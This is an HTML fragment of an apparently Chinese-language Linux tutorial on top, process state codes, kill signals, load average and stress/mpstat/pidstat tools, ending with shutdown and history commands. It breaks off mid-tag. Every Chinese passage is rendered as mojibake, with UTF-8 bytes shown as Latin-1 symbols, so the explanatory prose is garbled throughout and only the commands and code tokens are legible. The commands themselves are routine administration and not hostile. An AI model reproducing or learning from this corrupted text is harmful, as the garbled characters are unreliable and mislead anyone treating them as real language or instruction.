<li class="lvl-5">æŒ‰ <code>f</code> è¿›å…¥å­—æ®µé€‰æ‹©ç•Œé¢ï¼Œé€šè¿‡æ–¹å‘é”®æ·»åŠ  / åˆ é™¤å­—æ®µï¼ˆå¦‚ <code>CODE</code> ä»£ç å†…å­˜ã€<code>DATA</code> æ•°æ®æ®µå†…å­˜ï¼‰ã€‚</li>
<li class="lvl-5">æŒ‰ <code>o</code> è°ƒæ•´å­—æ®µé¡ºåºï¼ˆå¦‚å°† <code>%CPU</code> åˆ—ç§»è‡³é¦–ä½ï¼‰ã€‚</li>
</ul>
</li>
<li class="lvl-3">
<p><strong>å¤šè¿›ç¨‹ç›‘æ§</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">top -p 1234,5678  <span class="comment"># åŒæ—¶ç›‘æ§å¤šä¸ªè¿›ç¨‹ï¼ˆPID 1234 å’Œ 5678ï¼‰  </span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<h4 id="è¿›ç¨‹çŠ¶æ€ï¼ˆSTATï¼‰ä¿¡æ¯">è¿›ç¨‹çŠ¶æ€ï¼ˆSTATï¼‰ä¿¡æ¯</h4>
<p>åœ¨ Linux ç³»ç»Ÿä¸­ï¼Œé€šè¿‡<code>ps</code>ã€<code>top</code>ç­‰å‘½ä»¤æŸ¥çœ‹è¿›ç¨‹æ—¶ï¼ŒçŠ¶æ€æ ‡è¯†ï¼ˆå¦‚<code>R</code>ã€<code>S</code>ã€<code>Z</code>ç­‰ï¼‰ç›´è§‚åæ˜ äº†è¿›ç¨‹çš„å½“å‰è¡Œä¸ºã€‚ä»¥ä¸‹æ˜¯å„çŠ¶æ€åŠç›¸å…³ç¬¦å·çš„è¯´æ˜ï¼š</p>
<h5 id="æ ¸å¿ƒçŠ¶æ€æ ‡è¯†"><strong>æ ¸å¿ƒçŠ¶æ€æ ‡è¯†</strong></h5>
<p>è¿›ç¨‹çŠ¶æ€ç”±å†…æ ¸æ ¹æ®å…¶èµ„æºå ç”¨ã€è°ƒåº¦æƒ…å†µåŠ¨æ€æ ‡è®°ï¼Œæ ¸å¿ƒçŠ¶æ€æ ‡è¯†ï¼ˆProcess State Codesï¼‰å¦‚ä¸‹ï¼š</p>
<ol>
<li class="lvl-3">
<p><strong><code>R</code>ï¼ˆRunning / Runnableï¼Œè¿è¡ŒçŠ¶æ€ï¼‰</strong><br>
è¿›ç¨‹å¤„äº â€œå¯è¢« CPU è°ƒåº¦â€ çš„çŠ¶æ€ï¼šè¦ä¹ˆæ­£åœ¨å ç”¨ CPU æ‰§è¡ŒæŒ‡ä»¤ï¼Œè¦ä¹ˆå·²å°±ç»ªï¼ˆç­‰å¾… CPU åˆ†é…æ—¶é—´ç‰‡ï¼‰ã€‚æ­¤æ—¶è¿›ç¨‹ä½äºå†…æ ¸çš„ â€œå°±ç»ªé˜Ÿåˆ—â€ ä¸­ï¼Œæ˜¯ç³»ç»Ÿä¸­ â€œæ´»è·ƒâ€ çš„å…¸å‹ä»£è¡¨ã€‚</p>
</li>
<li class="lvl-3">
<p><strong><code>S</code>ï¼ˆInterruptible Sleepï¼Œå¯ä¸­æ–­ä¼‘çœ çŠ¶æ€ï¼‰</strong><br>
è¿›ç¨‹å› ç­‰å¾…æŸäº‹ä»¶ï¼ˆå¦‚ I/O æ“ä½œå®Œæˆã€ä¿¡å·è§¦å‘ã€å®šæ—¶å™¨è¶…æ—¶ç­‰ï¼‰è€Œæš‚åœæ‰§è¡Œï¼Œæ­¤æ—¶ä¸å ç”¨ CPU èµ„æºã€‚è¯¥çŠ¶æ€å¯è¢«å¤–éƒ¨ä¿¡å·ï¼ˆå¦‚<code>SIGINT</code>ï¼‰ä¸­æ–­å¹¶å”¤é†’ï¼ˆä¾‹å¦‚é€šè¿‡<code>kill</code>å‘½ä»¤å‘é€ä¿¡å·ï¼‰ã€‚</p>
<p>çŠ¶æ€è¡ç”Ÿç¬¦å·ï¼ˆä¼˜å…ˆçº§ç›¸å…³ï¼‰ï¼š</p>
<ul class="lvl-2">
<li class="lvl-5">
<p><code>S&lt;</code>ï¼šè¡¨ç¤ºè¿›ç¨‹å¤„äºé«˜ä¼˜å…ˆçº§å¯ä¸­æ–­ä¼‘çœ çŠ¶æ€ï¼ˆä¼˜å…ˆçº§é«˜äºé»˜è®¤å€¼ï¼‰ï¼Œå†…æ ¸ä¼šä¼˜å…ˆè°ƒåº¦å…¶å”¤é†’ã€‚</p>
</li>
<li class="lvl-5">
<p><code>SN</code>ï¼šè¡¨ç¤ºè¿›ç¨‹å¤„äºä½ä¼˜å…ˆçº§å¯ä¸­æ–­ä¼‘çœ çŠ¶æ€ï¼ˆä¼˜å…ˆçº§ä½äºé»˜è®¤å€¼ï¼‰ï¼Œè°ƒåº¦ä¼˜å…ˆçº§è¾ƒä½ã€‚</p>
</li>
</ul>
</li>
<li class="lvl-3">
<p><strong><code>T</code>ï¼ˆStopped / Tracedï¼Œåœæ­¢ / è·Ÿè¸ªçŠ¶æ€ï¼‰</strong><br>
è¿›ç¨‹è¢«ä¸»åŠ¨æš‚åœæ‰§è¡Œï¼Œé€šå¸¸ç”±ä»¥ä¸‹åœºæ™¯è§¦å‘ï¼š</p>
<ul class="lvl-2">
<li class="lvl-5">æ”¶åˆ°æš‚åœä¿¡å·ï¼ˆå¦‚<code>SIGSTOP</code>ï¼‰ï¼Œä¾‹å¦‚é€šè¿‡<code>Ctrl+z</code>æš‚åœå‰å°è¿›ç¨‹ï¼ˆå¦‚<code>ping 223.5.5.5</code>æ‰§è¡Œæ—¶ï¼Œ<code>Ctrl+z</code>ä¼šå°†å…¶æš‚åœä¸º<code>T</code>çŠ¶æ€ï¼‰ï¼›</li>
<li class="lvl-5">è¢«è°ƒè¯•å™¨ï¼ˆå¦‚<code>gdb</code>ï¼‰è·Ÿè¸ªï¼Œå¤„äºæ–­ç‚¹è°ƒè¯•çŠ¶æ€ã€‚</li>
</ul>
<p>è¯¥çŠ¶æ€çš„è¿›ç¨‹å¯é€šè¿‡<code>SIGCONT</code>ä¿¡å·æ¢å¤è¿è¡Œï¼ˆå¦‚<code>fg</code>å‘½ä»¤å°†åå°æš‚åœè¿›ç¨‹è°ƒè‡³å‰å°ï¼‰ï¼Œé€‚ç”¨äºæš‚ä¸æ˜ç¡®è¿›ç¨‹ä½œç”¨æ—¶ â€”â€” å…ˆæš‚åœè€Œéç›´æ¥<code>kill</code>ï¼Œé™ä½è¯¯æ“ä½œé£é™©ã€‚</p>
<p>æ“ä½œç¤ºä¾‹ï¼š</p>
<ul class="lvl-2">
<li class="lvl-5">
<p>æš‚åœè¿›ç¨‹ï¼š<code>ping 223.5.5.5</code>æ‰§è¡Œä¸­æŒ‰<code>Ctrl+z</code>ï¼Œè¿›ç¨‹è¿›å…¥<code>T</code>çŠ¶æ€ï¼›</p>
</li>
<li class="lvl-5">
<p>æŸ¥çœ‹æš‚åœä»»åŠ¡ï¼š<code>jobs</code>å‘½ä»¤ï¼ˆä»…æ˜¾ç¤ºå½“å‰ç»ˆç«¯ä¼šè¯åˆ›å»ºçš„ä»»åŠ¡ï¼‰ï¼›</p>
</li>
<li class="lvl-5">
<p>æ¢å¤è¿›ç¨‹ï¼š<code>fg %1</code>ï¼ˆå°†ç¼–å·ä¸º 1 çš„æš‚åœä»»åŠ¡è°ƒè‡³å‰å°ç»§ç»­è¿è¡Œï¼‰ï¼›</p>
</li>
<li class="lvl-5">
<p>å½»åº•ç»ˆæ­¢ï¼š<code>Ctrl+c</code>ç›´æ¥ç»ˆæ­¢å‰å°è¿›ç¨‹ï¼Œæˆ–<code>kill</code>å‘½ä»¤å‘é€ç»ˆæ­¢ä¿¡å·ã€‚</p>
</li>
</ul>
</li>
<li class="lvl-3">
<p><strong><code>D</code>ï¼ˆUninterruptible Sleepï¼Œä¸å¯ä¸­æ–­ä¼‘çœ çŠ¶æ€ï¼‰</strong><br>
è¿›ç¨‹å› ç­‰å¾… â€œä¸å¯ä¸­æ–­çš„ç³»ç»Ÿèµ„æºâ€ï¼ˆå¦‚ç£ç›˜ I/Oã€ç¡¬ä»¶è®¾å¤‡å“åº”ï¼‰è€Œè¿›å…¥æ·±åº¦ä¼‘çœ ï¼Œ<strong>ä¸å“åº”ä»»ä½•å¤–éƒ¨ä¿¡å·</strong>ï¼ˆåŒ…æ‹¬<code>kill -9</code>ï¼‰ã€‚å…¶è®¾è®¡ç›®çš„æ˜¯ç¡®ä¿å…³é”®èµ„æºæ“ä½œçš„åŸå­æ€§ï¼ˆå¦‚ MySQL æ‰§è¡Œå¤§é‡æ•°æ®å†™å…¥æ—¶ï¼Œéœ€ç­‰å¾…ç£ç›˜åŒæ­¥å®Œæˆï¼Œé¿å…æ•°æ®ä¸€è‡´æ€§é—®é¢˜ï¼‰ã€‚</p>
<p>æ³¨æ„ï¼š<code>D</code>çŠ¶æ€è¿›ç¨‹è™½ä¸ç›´æ¥å ç”¨ CPUï¼Œä½†ä¼šé”å®šç›¸å…³èµ„æºï¼Œè‹¥é•¿æœŸå­˜åœ¨å¯èƒ½æš—ç¤ºç¡¬ä»¶æ•…éšœï¼ˆå¦‚ç£ç›˜è¯»å†™è¶…æ—¶ï¼‰ã€‚</p>
</li>
<li class="lvl-3">
<p><strong><code>Z</code>ï¼ˆZombieï¼Œåƒµå°¸çŠ¶æ€ï¼‰</strong><br>
å­è¿›ç¨‹å·²ç»ˆæ­¢ï¼ˆé€€å‡ºï¼‰ï¼Œä½†çˆ¶è¿›ç¨‹æœªè°ƒç”¨<code>wait()</code>ç³»åˆ—ç³»ç»Ÿè°ƒç”¨å›æ”¶å…¶èµ„æºï¼ˆå¦‚è¿›ç¨‹ IDã€é€€å‡ºçŠ¶æ€ç­‰ï¼‰ï¼Œå¯¼è‡´å…¶æ®‹ç•™äºè¿›ç¨‹è¡¨ä¸­ã€‚åƒµå°¸è¿›ç¨‹ä¸å ç”¨ CPUã€å†…å­˜ç­‰å®é™…èµ„æºï¼Œä½†ä¼šæ¶ˆè€—è¿›ç¨‹è¡¨é¡¹ï¼ˆç³»ç»Ÿè¿›ç¨‹ ID æ•°é‡æœ‰é™ï¼‰ï¼Œç§¯ç´¯è¿‡å¤šå¯èƒ½å¯¼è‡´æ–°è¿›ç¨‹æ— æ³•åˆ›å»ºã€‚</p>
</li>
</ol>
<h5 id="çŠ¶æ€è¾…åŠ©ç¬¦å·">çŠ¶æ€è¾…åŠ©ç¬¦å·</h5>
<p>é™¤æ ¸å¿ƒçŠ¶æ€å¤–ï¼Œ<code>ps</code>å‘½ä»¤è¿˜ä¼šæ˜¾ç¤ºä»¥ä¸‹ç¬¦å·ï¼Œç”¨äºæè¿°è¿›ç¨‹çš„é™„åŠ å±æ€§ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>s</code>ï¼šè¿›ç¨‹ä¸º<strong>ä¼šè¯é¦–è¿›ç¨‹</strong>ï¼ˆSession Leaderï¼‰ï¼Œé€šå¸¸æ˜¯è¿›ç¨‹ç»„çš„çˆ¶è¿›ç¨‹ï¼Œè´Ÿè´£ç®¡ç†æ•´ä¸ªè¿›ç¨‹ç»„çš„ç”Ÿå‘½å‘¨æœŸï¼ˆå¦‚ç»ˆç«¯å¯åŠ¨çš„å‘½ä»¤è¿›ç¨‹å¤šä¸ºä¼šè¯é¦–è¿›ç¨‹ï¼‰ã€‚</p>
</li>
<li class="lvl-2">
<p><code>&lt;</code>ï¼šè¿›ç¨‹è¿è¡Œåœ¨<strong>é«˜ä¼˜å…ˆçº§</strong>ï¼ˆå¯¹åº”<code>S&lt;</code>çŠ¶æ€ï¼Œä¼˜å…ˆçº§å€¼ä½äºé»˜è®¤ï¼ŒLinux ä¼˜å…ˆçº§èŒƒå›´ä¸º - 20~19ï¼Œå€¼è¶Šå°ä¼˜å…ˆçº§è¶Šé«˜ï¼‰ã€‚</p>
</li>
<li class="lvl-2">
<p><code>N</code>ï¼šè¿›ç¨‹è¿è¡Œåœ¨<strong>ä½ä¼˜å…ˆçº§</strong>ï¼ˆå¯¹åº”<code>SN</code>çŠ¶æ€ï¼Œä¼˜å…ˆçº§å€¼é«˜äºé»˜è®¤ï¼‰ã€‚</p>
</li>
<li class="lvl-2">
<p><code>+</code>ï¼šè¿›ç¨‹å±äº<strong>å‰å°è¿›ç¨‹ç»„</strong>ï¼Œç›´æ¥æ¥æ”¶ç»ˆç«¯è¾“å…¥ï¼ˆå¦‚å½“å‰ç»ˆç«¯æ‰§è¡Œçš„<code>ls</code>å‘½ä»¤è¿›ç¨‹ï¼‰ã€‚</p>
</li>
<li class="lvl-2">
<p><code>l</code>ï¼šè¿›ç¨‹åŒ…å«<strong>å¤šä¸ªçº¿ç¨‹</strong>ï¼ˆLightweight Processï¼‰ï¼Œå¤šçº¿ç¨‹è¿›ç¨‹å¯å¹¶è¡Œå¤„ç†å¤šä¸ªä»»åŠ¡ï¼ˆå¦‚å¾®ä¿¡åŒæ—¶è¿è¡Œæ–‡å­—èŠå¤©ã€è§†é¢‘é€šè¯ç­‰åŠŸèƒ½ï¼Œåˆ†åˆ«ç”±ä¸åŒçº¿ç¨‹æ‰§è¡Œï¼‰ï¼Œæå‡ CPU åˆ©ç”¨ç‡ä¸å“åº”é€Ÿåº¦ã€‚</p>
</li>
</ul>
<p>ç»“åˆ<code>ps</code>ã€<code>top</code>ç­‰å·¥å…·æŸ¥çœ‹è¿›ç¨‹çŠ¶æ€å˜åŒ–ï¼Œé€šè¿‡çŠ¶æ€æ ‡è¯†å¯å¿«é€Ÿåˆ¤æ–­è¿›ç¨‹æ˜¯å¦æ­£å¸¸è¿è¡Œã€æ˜¯å¦å­˜åœ¨èµ„æºç«äº‰ã€æ˜¯å¦éœ€è¦å¹²é¢„ï¼ˆå¦‚ç»ˆæ­¢åƒµå°¸è¿›ç¨‹ã€æ’æŸ¥ D çŠ¶æ€è¿›ç¨‹çš„èµ„æºç“¶é¢ˆï¼‰ã€‚</p>
<h4 id="è¿›ç¨‹æ§åˆ¶ï¼škill-å‘½ä»¤">è¿›ç¨‹æ§åˆ¶ï¼škill å‘½ä»¤</h4>
<p><code>kill</code> å‘½ä»¤é€šè¿‡å‘è¿›ç¨‹å‘é€ <strong>ä¿¡å·ï¼ˆsignalï¼‰</strong> å®ç°è¿›ç¨‹æ§åˆ¶ï¼ˆç»ˆæ­¢ã€æš‚åœã€é‡å¯ç­‰ï¼‰ï¼Œæ ¸å¿ƒè¯­æ³•ä¸ºï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">kill</span> [å‚æ•°] &lt;è¿›ç¨‹æ ‡è¯†ç¬¦ï¼ˆPIDï¼‰&gt;</span><br></pre></td></tr></table></figure>
<h5 id="æ ¸å¿ƒå‚æ•°è¯´æ˜">æ ¸å¿ƒå‚æ•°è¯´æ˜</h5>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>-l</code>ï¼šåˆ—å‡ºæ‰€æœ‰å¯ç”¨ä¿¡å·ï¼ˆå…± 64 ç§ï¼Œæ ¼å¼å¦‚ <code>1) SIGHUP 9) SIGKILL</code>ï¼‰ã€‚</p>
</li>
<li class="lvl-2">
<p><code>-s &lt;ä¿¡å·&gt;</code>ï¼šæŒ‡å®šå‘é€çš„ä¿¡å·ï¼ˆå¯ç”¨åç§°æˆ–ç¼–å·ï¼Œå¦‚ <code>-s SIGKILL</code> æˆ– <code>-9</code>ï¼‰ã€‚</p>
</li>
<li class="lvl-2">
<p><code>-p</code>ï¼šä»…è¾“å‡ºç›®æ ‡è¿›ç¨‹çš„ PIDï¼Œä¸å‘é€ä»»ä½•ä¿¡å·ï¼ˆç”¨äºéªŒè¯è¿›ç¨‹å­˜åœ¨æ€§ï¼‰ã€‚</p>
</li>
</ul>
<h5 id="å¸¸ç”¨ä¿¡å·åŠåœºæ™¯">å¸¸ç”¨ä¿¡å·åŠåœºæ™¯</h5>
<table>
<thead>
<tr>
<th>ä¿¡å·åç§°</th>
<th>ç¼–å·</th>
<th>åŠŸèƒ½è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>SIGHUP</code></td>
<td>1</td>
<td>é€šçŸ¥è¿›ç¨‹é‡æ–°åŠ è½½é…ç½®æ–‡ä»¶ï¼ˆå¦‚ <code>nginx</code> æœåŠ¡é‡è½½ï¼‰ã€‚</td>
</tr>
<tr>
<td><code>SIGINT</code></td>
<td>2</td>
<td>ä¸­æ–­è¿›ç¨‹ï¼ˆé€šå¸¸ç”± <code>Ctrl+C</code> è§¦å‘ï¼Œå¯è¢«è¿›ç¨‹æ•è·å¤„ç†ï¼‰ã€‚</td>
</tr>
<tr>
<td><code>SIGKILL</code></td>
<td>9</td>
<td>å¼ºåˆ¶ç»ˆæ­¢è¿›ç¨‹ï¼ˆä¸å¯è¢«æ•è·æˆ–å¿½ç•¥ï¼Œé€‚ç”¨äºæ— æ³•æ­£å¸¸ç»ˆæ­¢çš„è¿›ç¨‹ï¼‰ã€‚</td>
</tr>
<tr>
<td><code>SIGTERM</code></td>
<td>15</td>
<td>ä¼˜é›…ç»ˆæ­¢è¿›ç¨‹ï¼ˆé»˜è®¤ä¿¡å·ï¼Œå…è®¸è¿›ç¨‹é‡Šæ”¾èµ„æºåé€€å‡ºï¼Œä¼˜å…ˆæ¨èä½¿ç”¨ï¼‰ã€‚</td>
</tr>
<tr>
<td><code>SIGSTOP</code></td>
<td>19</td>
<td>æš‚åœè¿›ç¨‹ï¼ˆä¸å¯è¢«å¿½ç•¥ï¼Œéœ€é…åˆ <code>SIGCONT</code> æ¢å¤ï¼‰ã€‚</td>
</tr>
<tr>
<td><code>SIGCONT</code></td>
<td>18</td>
<td>æ¢å¤è¢« <code>SIGSTOP</code> æš‚åœçš„è¿›ç¨‹ã€‚</td>
</tr>
</tbody>
</table>
<h5 id="æ³¨æ„äº‹é¡¹">æ³¨æ„äº‹é¡¹</h5>
<ol>
<li class="lvl-3">
<p><strong>æƒé™è¦æ±‚</strong>ï¼šä»…è¿›ç¨‹æ‰€æœ‰è€…æˆ– <code>root</code> å¯å‘é€ä¿¡å·ï¼ˆæ™®é€šç”¨æˆ·æ— æ³•ç»ˆæ­¢å…¶ä»–ç”¨æˆ·çš„è¿›ç¨‹ï¼‰ã€‚</p>
</li>
<li class="lvl-3">
<p><strong>å¼ºåˆ¶ç»ˆæ­¢é£é™©</strong>ï¼š<code>SIGKILL</code>ï¼ˆä¿¡å· 9ï¼‰å¯èƒ½å¯¼è‡´æ•°æ®ä¸¢å¤±ï¼ˆå¦‚æœªä¿å­˜çš„æ–‡ä»¶ï¼‰ï¼Œå°¤å…¶å¯¹å­˜å‚¨æœåŠ¡ï¼ˆå¦‚æ•°æ®åº“ï¼‰éœ€è°¨æ…ä½¿ç”¨ã€‚</p>
</li>
<li class="lvl-3">
<p><strong>ä¿¡å·é‡è¯•</strong>ï¼šéƒ¨åˆ†å®ˆæŠ¤è¿›ç¨‹å¯èƒ½å¿½ç•¥ <code>SIGTERM</code>ï¼Œå¯å…ˆå°è¯• <code>SIGTERM</code>ï¼Œæ— æ•ˆå†ç”¨ <code>SIGKILL</code>ã€‚</p>
</li>
</ol>
<h4 id="ç³»ç»Ÿå¹³å‡è´Ÿè½½">ç³»ç»Ÿå¹³å‡è´Ÿè½½</h4>
<p>å¹³å‡è´Ÿè½½å®šä¹‰ä¸º <strong>å•ä½æ—¶é—´å†…ï¼Œç³»ç»Ÿä¸­å¤„äºã€Œå¯è¿è¡ŒçŠ¶æ€ï¼ˆRï¼‰ã€å’Œã€Œä¸å¯ä¸­æ–­çŠ¶æ€ï¼ˆDï¼‰ã€çš„å¹³å‡è¿›ç¨‹æ•°</strong>ï¼ˆå³<strong>æ´»è·ƒè¿›ç¨‹æ•°</strong>ï¼‰ï¼Œä¸ CPU ä½¿ç”¨ç‡æ— ç›´æ¥å…³è”ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>å¯è¿è¡ŒçŠ¶æ€ï¼ˆRï¼‰</strong>ï¼šæ­£åœ¨å ç”¨ CPUï¼Œæˆ–ç­‰å¾… CPU è°ƒåº¦çš„è¿›ç¨‹ï¼ˆ<code>ps</code>å‘½ä»¤å¯è§ï¼‰ã€‚</p>
</li>
<li class="lvl-2">
<p><strong>ä¸å¯ä¸­æ–­çŠ¶æ€ï¼ˆDï¼‰</strong>ï¼šç­‰å¾…ç¡¬ä»¶ I/O å“åº”çš„è¿›ç¨‹ï¼ˆå¦‚ç£ç›˜å†™å…¥æ—¶çš„ä¿æŠ¤æœºåˆ¶ï¼Œä¸­æ–­ä¼šå¯¼è‡´æ•°æ®ä¸€è‡´æ€§é—®é¢˜ï¼Œ<code>ps</code>å‘½ä»¤å¯è§ä¸º<code>D</code>çŠ¶æ€ï¼‰ã€‚</p>
</li>
</ul>
<h5 id="ç³»ç»Ÿå¹³å‡è´Ÿè½½çš„åˆç†èŒƒå›´">ç³»ç»Ÿå¹³å‡è´Ÿè½½çš„åˆç†èŒƒå›´</h5>
<p>ç³»ç»Ÿå¹³å‡è´Ÿè½½çš„åˆç†èŒƒå›´ä¸ CPU æ ¸å¿ƒæ•°å¼ºç»‘å®šã€‚ç†æƒ³çŠ¶æ€ï¼š<strong>å¹³å‡è´Ÿè½½ â‰ˆ CPU æ ¸å¿ƒæ•°</strong>ï¼ˆæ¯ä¸ªæ ¸å¿ƒæ°å¥½è¿è¡Œ 1 ä¸ªè¿›ç¨‹ï¼‰ã€‚ä¸åŒæ ¸å¿ƒæ•°ä¸‹ï¼Œç›¸åŒè´Ÿè½½çš„æ„ä¹‰æˆªç„¶ä¸åŒï¼š</p>
<table>
<thead>
<tr>
<th>CPU æ ¸å¿ƒæ•°</th>
<th>å¹³å‡è´Ÿè½½ = 2 çš„å«ä¹‰</th>
</tr>
</thead>
<tbody>
<tr>
<td>4 æ ¸</td>
<td>CPU ä½¿ç”¨ç‡ 50%ï¼ˆ50% èµ„æºç©ºé—²ï¼‰</td>
</tr>
<tr>
<td>2 æ ¸</td>
<td>CPU ä½¿ç”¨ç‡ 100%ï¼ˆèµ„æºåˆšå¥½ç”¨æ»¡ï¼‰</td>
</tr>
<tr>
<td>1 æ ¸</td>
<td>CPU ä½¿ç”¨ç‡ 200%ï¼ˆ50% è¿›ç¨‹éœ€ç­‰å¾… CPUï¼‰</td>
</tr>
</tbody>
</table>
<h5 id="æ—¶é—´ç»´åº¦çš„è§£è¯»">æ—¶é—´ç»´åº¦çš„è§£è¯»</h5>
<p>å¹³å‡è´Ÿè½½åŒ…å« <strong>1 åˆ†é’Ÿã€5 åˆ†é’Ÿã€15 åˆ†é’Ÿ</strong> ä¸‰ä¸ªå€¼ï¼Œéœ€ç»“åˆåˆ¤æ–­è¶‹åŠ¿ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>ä¸‰è€…æ¥è¿‘</strong> â†’ è´Ÿè½½å¹³ç¨³ï¼›</p>
</li>
<li class="lvl-2">
<p><strong>1 åˆ†é’Ÿå€¼ â‰« 15 åˆ†é’Ÿ</strong> â†’ è¿‘æœŸè´Ÿè½½çªå¢ï¼ˆéœ€ç´§æ€¥æ’æŸ¥ï¼‰ï¼›</p>
</li>
<li class="lvl-2">
<p><strong>1 åˆ†é’Ÿå€¼ â‰ª 15 åˆ†é’Ÿ</strong> â†’ è¿‘æœŸè´Ÿè½½ä¸‹é™ï¼ˆå…³æ³¨å†å²ç“¶é¢ˆï¼‰ã€‚</p>
</li>
</ul>
<p><strong>å‘Šè­¦å»ºè®®</strong>ï¼šå½“å¹³å‡è´Ÿè½½è¶…è¿‡ CPU æ ¸å¿ƒæ•°çš„ 70% æ—¶ï¼Œå»ºè®®ä»‹å…¥åˆ†æï¼ˆéœ€ç»“åˆå†å²æ•°æ®åŠ¨æ€è°ƒæ•´é˜ˆå€¼ï¼‰ã€‚</p>
<h5 id="ä¸-CPU-ä½¿ç”¨ç‡çš„åŒºåˆ«">ä¸ CPU ä½¿ç”¨ç‡çš„åŒºåˆ«</h5>
<p>å¹³å‡è´Ÿè½½æ¶µç›– <strong>ç­‰å¾… CPUã€ç­‰å¾… I/Oã€è¿›ç¨‹è°ƒåº¦</strong> çš„è¿›ç¨‹ï¼Œè€Œ CPU ä½¿ç”¨ç‡ä»…ç»Ÿè®¡ CPU ç¹å¿™ç¨‹åº¦ï¼ŒäºŒè€…åœ¨ä¸åŒåœºæ™¯ä¸‹è¡¨ç°ä¸åŒï¼š</p>
<table>
<thead>
<tr>
<th>åºå·</th>
<th>è´Ÿè½½å‡é«˜åœºæ™¯</th>
<th>å¹³å‡è´Ÿè½½å˜åŒ–</th>
<th>use%</th>
<th>sys%</th>
<th>wait%</th>
<th>CPU æ•´ä½“ä½¿ç”¨ç‡</th>
<th>ç£ç›˜ IO æ¶ˆè€—</th>
</tr>
</thead>
<tbody>
<tr>
<td>01</td>
<td>CPU å¯†é›†å‹è¿›ç¨‹</td>
<td>å‡é«˜</td>
<td>æ¶ˆè€—å¤š</td>
<td>æ¶ˆè€—å°‘</td>
<td>æ¶ˆè€—å°‘</td>
<td>ä½¿ç”¨ç‡é«˜ï¼ˆæŸä¸ªæ ¸å¿ƒï¼‰</td>
<td>ç£ç›˜æ¶ˆè€—å°</td>
</tr>
<tr>
<td>02</td>
<td>IO å¯†é›†å‹è¿›ç¨‹</td>
<td>å‡é«˜</td>
<td>æ¶ˆè€—å°‘</td>
<td>æ¶ˆè€—å¤š</td>
<td>æ¶ˆè€—å¤š</td>
<td>ä½¿ç”¨ç‡ä½</td>
<td>ç£ç›˜æ¶ˆè€—å¤§</td>
</tr>
<tr>
<td>03</td>
<td>å¤§é‡è¿›ç¨‹äº§ç”Ÿ</td>
<td>å‡é«˜</td>
<td>æ¶ˆè€—å¤š</td>
<td>æ¶ˆè€—å°‘</td>
<td>æ¶ˆè€—å¤š</td>
<td>ä½¿ç”¨ç‡é«˜ï¼ˆæ‰€æœ‰æ ¸å¿ƒï¼‰</td>
<td>ç£ç›˜æ¶ˆè€—å°</td>
</tr>
</tbody>
</table>
<h5 id="é—®é¢˜æ’æŸ¥æ ¸å¿ƒæ€è·¯">é—®é¢˜æ’æŸ¥æ ¸å¿ƒæ€è·¯</h5>
<ol>
<li class="lvl-3">
<p><strong>æŸ¥çœ‹è´Ÿè½½</strong>ï¼šé€šè¿‡ <code>uptime</code>/<code>top</code> è·å– 1/5/15 åˆ†é’Ÿè´Ÿè½½å€¼ï¼Œåˆ¤æ–­è¶‹åŠ¿ã€‚</p>
</li>
<li class="lvl-3">
<p><strong>åˆ†æ CPU</strong>ï¼šç”¨ <code>mpstat</code> æŸ¥çœ‹å¤šæ ¸è´Ÿè½½ã€iowait ç­‰æŒ‡æ ‡ï¼Œå®šä½ç“¶é¢ˆç±»å‹ï¼ˆCPU è®¡ç®— / IO ç­‰å¾…ï¼‰ã€‚</p>
</li>
<li class="lvl-3">
<p><strong>å®šä½è¿›ç¨‹</strong>ï¼šé€šè¿‡ <code>pidstat</code>/<code>top</code> è¿½è¸ªé«˜è´Ÿè½½è¿›ç¨‹ï¼ˆCPU/IO å ç”¨å¼‚å¸¸çš„è¿›ç¨‹ï¼‰ã€‚</p>
</li>
<li class="lvl-3">
<p><strong>æ—¥å¿—æº¯æº</strong>ï¼šç»“åˆè¿›ç¨‹æ‰€å±æœåŠ¡çš„æ—¥å¿—ï¼Œåˆ†æä»£ç é€»è¾‘æˆ–èµ„æºé…ç½®é—®é¢˜ã€‚</p>
</li>
</ol>
<p><strong>å‹åŠ›æµ‹è¯•ä¸ç›‘æ§å·¥å…·</strong>ï¼š</p>
<p>stressæ˜¯Linuxç³»ç»Ÿå‹åŠ›æµ‹è¯•å·¥å…·ï¼Œå¯ä»¥ç”¨ä½œå¼‚å¸¸è¿›ç¨‹æ¨¡æ‹Ÿå¹³å‡è´Ÿè½½å‡é«˜çš„åœºæ™¯ã€‚</p>
<p>mpstat:æ˜¯å¤šæ ¸CPUæ€§èƒ½åˆ†æå·¥å…·ï¼Œç”¨æ¥å®æ—¶æŸ¥çœ‹æ¯ä¸ªCPUçš„æ€§èƒ½æŒ‡æ ‡ï¼Œä»¥åŠæ‰€æœ‰CPUçš„å¹³å‡æŒ‡æ ‡;</p>
<p>pidstat:æ˜¯å¸¸ç”¨çš„è¿›ç¨‹æ€§èƒ½åˆ†æå·¥å…·ï¼Œç”¨æ¥å®æ—¶æŸ¥çœ‹è¿›ç¨‹çš„CPUã€å†…å­˜ã€1/0ä»¥åŠä¸Šä¸‹æ–‡åˆ‡æ¢ç­‰æ€§èƒ½æŒ‡æ ‡;</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install -y sysstat stress  <span class="comment"># sysstatå«mpstat/pidstatï¼Œstressç”¨äºå‹åŠ›æµ‹è¯•</span></span><br></pre></td></tr></table></figure>
<h3 id="ç³»ç»Ÿç®¡ç†å‘½ä»¤">ç³»ç»Ÿç®¡ç†å‘½ä»¤</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># history æŸ¥çœ‹å†å²å‘½ä»¤</span></span><br><span class="line"><span class="built_in">history</span> -c   <span class="comment">#æ¸…é™¤å†å²è®°å½•ï¼ˆæ…ç”¨ï¼‰</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#å…³æœºå‘½ä»¤ --å…³é—­è™šæ‹Ÿç³»ç»Ÿ</span></span><br><span class="line">shutdown -h now    <span class="comment">#ç«‹å³å…³æœº</span></span><br><span class="line">shutdown -h 0      <span class="comment">#ç«‹å³å…³æœº</span></span><br><span class="line">shutdown -h now    <span class="comment">#ç«‹å³å…³æœº</span></span><br><span class="line">shutdown -h 5      <span 